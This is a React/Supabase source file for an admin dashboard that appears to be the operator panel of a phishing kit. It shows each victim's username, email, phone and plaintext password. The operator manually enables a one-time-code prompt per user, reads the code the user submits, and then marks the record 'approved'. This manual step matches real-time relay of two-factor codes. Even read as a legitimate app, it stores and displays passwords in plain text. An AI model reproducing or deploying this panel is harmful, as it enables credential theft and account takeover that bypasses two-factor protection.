'use client'

import { useState, useEffect } from 'react'
import { supabase } from '@/lib/supabase'
import { Loader2, Check, X, Eye, EyeOff, UserCheck, Clock, Key } from 'lucide-react'

export default function AdminPage() {
  const [users, setUsers] = useState([])
  const [loading, setLoading] = useState(true)
  const [showPasswords, setShowPasswords] = useState({})
  const [selectedTab, setSelectedTab] = useState('all')

  useEffect(() => {
    fetchUsers()
    
    const subscription = supabase
      .channel('users_channel')
      .on('postgres_changes', 
        { event: '*', schema: 'public', table: 'users' }, 
        () => fetchUsers()
      )
      .subscribe()

    return () => subscription.unsubscribe()
  }, [])

  const fetchUsers = async () => {
    setLoading(true)
    const { data, error } = await supabase
      .from('users')
      .select('*')
      .order('created_at', { ascending: false })

    if (!error && data) {
      setUsers(data)
    }
    setLoading(false)
  }

  const handleAllowOtpInput = async (userId) => {
    const { error } = await supabase
      .from('users')
      .update({ 
        show_otp_input: true
      })
      .eq('id', userId)

    if (!error) {
      console.log('OTP input enabled for user:', userId)
    }
  }

  const handleFinalApprove = async (userId) => {
    const { error } = await supabase
      .from('users')
      .update({ 
        is_approved: true,
        approved_at: new Date().toISOString()
      })
      .eq('id', userId)

    if (!error) {
      console.log('User approved:', userId)
    }
  }

  const handleReject = async (userId) => {
    const { error } = await supabase
      .from('users')
      .delete()
      .eq('id', userId)

    if (!error) {
      console.log('User rejected:', userId)
    }
  }

  const togglePasswordVisibility = (userId) => {
    setShowPasswords(prev => ({
      ...prev,
      [userId]: !prev[userId]
    }))
  }

  const getStatusBadge = (user) => {
    if (user.is_approved) {
      return <span className="px-2 py-1 text-xs font-semibold rounded-full bg-green-100 text-green-800">Approved</span>
    }
    if (user.user_entered_otp) {
      return <span className="px-2 py-1 text-xs font-semibold rounded-full bg-blue-100 text-blue-800">OTP Submitted</span>
    }
    if (user.show_otp_input) {
      return <span className="px-2 py-1 text-xs font-semibold rounded-full bg-purple-100 text-purple-800">OTP Input Enabled</span>
    }
    return <span className="px-2 py-1 text-xs font-semibold rounded-full bg-yellow-100 text-yellow-800">Pending</span>
  }

  const filteredUsers = users.filter(user => {
    if (selectedTab === 'pending') return !user.show_otp_input && !user.user_entered_otp && !user.is_approved
    if (selectedTab === 'otp_enabled') return user.show_otp_input && !user.user_entered_otp && !user.is_approved
    if (selectedTab === 'otp_submitted') return user.user_entered_otp && !user.is_approved
    if (selectedTab === 'approved') return user.is_approved
    return true
  })

  if (loading) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <Loader2 className="h-12 w-12 animate-spin text-white" />
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-black p-8">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold text-white mb-8">Admin Dashboard</h1>
        
        {/* Tabs */}
        <div className="flex space-x-2 mb-6 border-b border-gray-800 pb-4 overflow-x-auto">
          <button
            onClick={() => setSelectedTab('all')}
            className={`px-4 py-2 text-sm font-medium rounded-lg whitespace-nowrap ${
              selectedTab === 'all' 
                ? 'bg-blue-600 text-white' 
                : 'text-gray-400 hover:text-white hover:bg-gray-800'
            }`}
          >
            All Users ({users.length})
          </button>
          <button
            onClick={() => setSelectedTab('pending')}
            className={`px-4 py-2 text-sm font-medium rounded-lg whitespace-nowrap ${
              selectedTab === 'pending' 
                ? 'bg-blue-600 text-white' 
                : 'text-gray-400 hover:text-white hover:bg-gray-800'
            }`}
          >
            Pending ({users.filter(u => !u.show_otp_input && !u.user_entered_otp && !u.is_approved).length})
          </button>
          <button
            onClick={() => setSelectedTab('otp_enabled')}
            className={`px-4 py-2 text-sm font-medium rounded-lg whitespace-nowrap ${
              selectedTab === 'otp_enabled' 
                ? 'bg-blue-600 text-white' 
                : 'text-gray-400 hover:text-white hover:bg-gray-800'
            }`}
          >
            OTP Enabled ({users.filter(u => u.show_otp_input && !u.user_entered_otp && !u.is_approved).length})
          </button>
          <button
            onClick={() => setSelectedTab('otp_submitted')}
            className={`px-4 py-2 text-sm font-medium rounded-lg whitespace-nowrap ${
              selectedTab === 'otp_submitted' 
                ? 'bg-blue-600 text-white' 
                : 'text-gray-400 hover:text-white hover:bg-gray-800'
            }`}
          >
            OTP Submitted ({users.filter(u => u.user_entered_otp && !u.is_approved).length})
          </button>
          <button
            onClick={() => setSelectedTab('approved')}
            className={`px-4 py-2 text-sm font-medium rounded-lg whitespace-nowrap ${
              selectedTab === 'approved' 
                ? 'bg-blue-600 text-white' 
                : 'text-gray-400 hover:text-white hover:bg-gray-800'
            }`}
          >
            Approved ({users.filter(u => u.is_approved).length})
          </button>
        </div>
        
        <div className="bg-gray-900 rounded-lg overflow-hidden">
          <div className="px-6 py-4 border-b border-gray-800">
            <h2 className="text-xl font-semibold text-white">User Management</h2>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead className="bg-gray-800">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">User</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Contact</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Password</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">OTP Entered</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Status</th>
                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-800">
                {filteredUsers.map((user) => (
                  <tr key={user.id} className="hover:bg-gray-800/50">
                    <td className="px-6 py-4">
                      <div className="text-sm font-medium text-white">{user.username || 'N/A'}</div>
                      <div className="text-sm text-gray-400">{user.email || 'N/A'}</div>
                    </td>
                    <td className="px-6 py-4">
                      <div className="text-sm text-gray-300">{user.phone || 'N/A'}</div>
                    </td>
                    <td className="px-6 py-4">
                      <div className="flex items-center space-x-2">
                        <span className="text-sm font-mono text-gray-300">
                          {showPasswords[user.id] ? user.password : '••••••••'}
                        </span>
                        <button
                          onClick={() => togglePasswordVisibility(user.id)}
                          className="text-gray-400 hover:text-gray-300"
                        >
                          {showPasswords[user.id] ? 
                            <EyeOff className="h-4 w-4" /> : 
                            <Eye className="h-4 w-4" />
                          }
                        </button>
                      </div>
                    </td>
                    <td className="px-6 py-4">
                      <span className="text-sm font-mono text-gray-300">
                        {user.user_entered_otp || '—'}
                      </span>
                    </td>
                    <td className="px-6 py-4">
                      {getStatusBadge(user)}
                    </td>
                    <td className="px-6 py-4 text-sm font-medium">
                      {!user.show_otp_input && !user.user_entered_otp && !user.is_approved && (
                        <button
                          onClick={() => handleAllowOtpInput(user.id)}
                          className="text-blue-400 hover:text-blue-300 mr-2"
                          title="Allow OTP Input"
                        >
                          <Key className="h-5 w-5" />
                        </button>
                      )}
                      
                      {user.user_entered_otp && !user.is_approved && (
                        <button
                          onClick={() => handleFinalApprove(user.id)}
                          className="text-green-400 hover:text-green-300 mr-2"
                          title="Approve User"
                        >
                          <UserCheck className="h-5 w-5" />
                        </button>
                      )}
                      
                      {!user.is_approved && (
                        <button
                          onClick={() => handleReject(user.id)}
                          className="text-red-400 hover:text-red-300"
                          title="Reject User"
                        >
                          <X className="h-5 w-5" />
                        </button>
                      )}
                      
                      {user.is_approved && (
                        <span className="text-green-400 text-xs font-medium">✓ Approved</span>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  )
}